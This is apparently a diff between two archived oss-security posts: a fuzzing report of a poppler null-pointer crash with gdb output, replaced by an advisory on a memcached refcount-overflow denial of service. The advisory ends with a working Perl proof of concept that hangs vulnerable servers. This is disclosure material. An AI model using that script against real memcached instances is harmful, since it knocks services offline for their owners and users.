@@ -1,82 +1,173 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/11/10/1
-Message-ID: <CAG8b5tT5Ob5b1CD=nMFWkJTfVfwvREW3vGw=rpHruB6Tj+NJtw@mail.gmail.com>
-Date: Sat, 10 Nov 2018 16:22:53 +0530
-From: Dhiraj Mishra <mishra.dhiraj95@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/03/08/7
+Message-ID: <alpine.DEB.2.20.1803081246570.25482@di7>
+Date: Thu, 8 Mar 2018 13:15:09 -0800 (PST)
+From: dormando <dormando@...ia.net>
 To: oss-security@...ts.openwall.com
-Subject: null-pointer dereference in poppler library
+Subject: Re: Memcached remote DoS in older versions
 Content-Type: text/plain; charset=utf-8
 
-## Summary
+> Hello,
+>
+> There are a number of hang/crash bugs fixed in older versions of
+> memcached. All are noted in the release notes of the versions containing
+> the respective fixes, and most are years old.
+>
+> I'm writing this in case pointing this out can help drive users to close
+> their instances from the internet; aside from participating in DDoS
+> attacks and remote users being able to read any data stored in the
+> instances, they can also be crashed or deadlocked.
 
-While fuzzing evince v3.28.4, on linux 4.15.0-38-generic (Ubuntu 18.04
-LTS), a null-pointer dereference was observed, initially this was reported
-to evince but the evince team advised that the issue is in poppler, the
-library used by evince to render PDF. Poppler version: 0.62.0-2ubuntu2.2 is
-vulnerable to null-pointer dereference, however the issue is already fixed
-in poppler 0.70, but this will still crash your evince v3.28.4 if poppler
-is not updated to v.0.70.
+I've requested a CVE.
 
-## Debug
+After further testing, this particular flaw affects versions 1.4.11
+through 1.4.36.
+1.4.11 was released January 16th, 2012.
+1.4.37 (the fix) was released June 4th, 2017.
 
-(gdb) run NullPointerDeference.h_134
-Starting program: /usr/bin/evince NullPointerDeference.h_134
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-[New Thread 0x7fd84d3cf700 (LWP 17587)]
-[New Thread 0x7fd84cbce700 (LWP 17588)]
-[New Thread 0x7fd84718c700 (LWP 17589)]
-[New Thread 0x7fd84651c700 (LWP 17594)]
-[New Thread 0x7fd845b0e700 (LWP 17596)]
-[New Thread 0x7fd83223e700 (LWP 17597)]
+The fix came from a user reporting deadlocks in running instances, caused
+by a bug in their application triggering this particular bug.
 
-Thread 7 "EvJobScheduler" received signal SIGSEGV, Segmentation fault.
-[Switching to Thread 0x7fd83223e700 (LWP 17597)]
-0x00007fd8315f629a in _poppler_attachment_new(FileSpec*) () from
-/usr/lib/x86_64-linux-gnu/libpoppler-glib.so.8
-(gdb) bt
-#0  0x00007fd8315f629a in _poppler_attachment_new(FileSpec*) () at
-/usr/lib/x86_64-linux-gnu/libpoppler-glib.so.8
-#1  0x00007fd8315fa14a in poppler_annot_file_attachment_get_attachment ()
-at /usr/lib/x86_64-linux-gnu/libpoppler-glib.so.8
-#2  0x00007fd83183673d in  () at
-/usr/lib/x86_64-linux-gnu/evince/4/backends/libpdfdocument.so
-#3  0x00007fd8592c3bfa in  () at /usr/lib/x86_64-linux-gnu/libevview3.so.3
-#4  0x00007fd8592c5c02 in  () at /usr/lib/x86_64-linux-gnu/libevview3.so.3
-#5  0x00007fd856bbee85 in  () at /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
-#6  0x00007fd8565956db in start_thread (arg=0x7fd83223e700) at
-pthread_create.c:463
-#7  0x00007fd8562be88f in clone () at
-../sysdeps/unix/sysv/linux/x86_64/clone.S:95
-(gdb) i r
-rax            0x0    0
-rbx            0x0    0
-rcx            0x0    0
-rdx            0x0    0
-rsi            0x7fd82c0587c0    140566428223424
-rdi            0x55720784c640    93948240774720
-rbp            0x7fd834004a90    0x7fd834004a90
-rsp            0x7fd83223d9e0    0x7fd83223d9e0
-r8             0xffffffffffffffb0    -80
-r9             0x10    16
-r10            0x7fd82c0008d0    140566427863248
-r11            0x1    1
-r12            0x7fd82c0587c0    140566428223424
-r13            0x7fd834004a80    140566562097792
-r14            0x5572072f5a60    93948235176544
-r15            0x0    0
-rip            0x7fd8315f629a    0x7fd8315f629a
-<_poppler_attachment_new(FileSpec*)+122>
-eflags         0x10206    [ PF IF RF ]
-cs             0x33    51
-ss             0x2b    43
-ds             0x0    0
-es             0x0    0
-fs             0x0    0
-gs             0x0    0
-(gdb) info reg ebp rip
-ebp            0x34004a90    872434320
-rip            0x7fd8315f629a    0x7fd8315f629a
-<_poppler_attachment_new(FileSpec*)+122>
-(gdb)
+It's highly recommended that users not expose memcached directly to the
+internet, as this may allow malicious users to read contents of memory,
+remote DDoS via the UDP protocol, or crash and hang the instance.
 
+There are also likely other similar issues in even older code.
+
+DESCRIPTION
+===========
+
+In versions 1.4.9-11, the items.c:item_remove() was refactored as part of
+a thread scalability project. The function will free an item back to slab
+memory if the reference count has dropped to zero, *and* the item is no
+longer referenced in the hash table + LRU. In .11, the secondary check for
+ITEM_LINKED bit was not re-added after a bug fix.
+
+An integer overflow bug has existed as long as memcached has, where many
+gets for the same key (> 2^16 in a single multiget or across many slow
+connections) can cause the refcount value to overflow.
+
+After .11, the item will automatically free while still being linked in
+the LRU and hash table. This allows the memory to be reused for a
+different item, while still existing in the hash table + LRU.
+
+Items contain embedded NEXT and PREV links for the LRU. This memory is not
+explicitly cleared when items return to the slab allocator.
+
+If this bug is hit multiple times, it can cause data corruption, loops in
+the LRU, or loops in hash chain buckets where no valid key is found.
+
+IMPACT
+======
+
+Instances with loops in the LRU's and hash chains can cause a worker
+thread to spin CPU while holding various locks (cache_lock in older
+versions, item locks in newer ones). Other worker threads can then hang by
+requesting the same item lock. The daemon then requires a restart to
+become functional again.
+
+I've only tested this against local instances built directly from source.
+It is not known to me if long running instances are vulnerable.
+
+MITIGATION
+==========
+
+Do not expose memcached to untrusted clients. No software mitigations are
+known beyond upgrading.
+
+RESOLUTION
+==========
+
+Versions 1.4.37 and newer prevent trivial refcount overflows. Running the
+latest version with UDP disabled is highly recommended in general.
+
+The specific fix is in:
+https://github.com/memcached/memcached/commit/a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00
+
+If anyone wishes to backport. It is also possible to limit the impact of
+the problem by re-adding the ITEM_LINKED bit check in item_remove().
+
+POC FOLLOWS
+===========
+
+#!/usr/bin/perl
+# It may be necessary to run a "flush_all" for this to work on long running
+# instances.
+
+use warnings;
+use strict;
+
+use IO::Socket::INET;
+
+my $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
+die unless $s;
+
+my $USE_SIZES = 0;
+
+print $s "version\r\n";
+my $r = <$s>;
+if ($r =~ m/^VERSION 1\.5\./) {
+    die "unaffected";
+} elsif ($r =~ m/^VERSION 1\.(\d+)\.(\d+)/) {
+    die "unaffected" if ($1 == 4 && $2 > 36)
+        || ($1 == 4 && $2 < 11)
+        || ($1 < 4);
+    if (($1 == 4 && $2 < 25) ) {
+        print "using 'stats sizes' for < 1.4.25\n";
+        $USE_SIZES = 1;
+    }
+} else {
+    die "Unknown/unaffected";
+}
+
+$SIG{ALRM} = sub { die "dead\n" };
+
+my $get = 'dd ' x 65540;
+chop $get;
+my $count = 0;
+while (1) {
+    eval {
+        print "break\n";
+        alarm 20;
+        print $s "version\r\n";
+        $r = <$s>;
+        print $s "set dd 0 0 2\r\nno\r\n";
+        $r = <$s>;
+        print $s "get $get\r\n";
+        wait_end($s);
+        print $s "get dd\r\n";
+        wait_end($s);
+        if ($USE_SIZES && $count > 10) {
+            # stats sizes infinite loop while holding cache_lock
+            print $s "set foo 0 0 2\r\nok\r\n";
+            $r = <$s>;
+            print $s "stats sizes\r\n";
+            wait_end($s);
+            $count = 0;
+        }
+        alarm 0;
+        $count++;
+    };
+    if ($@ && $@ eq "dead\n") {
+        print "hang\n";
+        eval {
+            alarm 10;
+            # hang other worker threads on stuck item lock
+            for (1..50) {
+                $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
+                print $s "get dd\r\n";
+            }
+        };
+        die "done";
+    } elsif ($@) {
+        die $@;
+    }
+}
+
+sub wait_end {
+    my $s = shift;
+    while (1) {
+        my $r = <$s>;
+        last if $r =~ m/END/;
+    }
+}
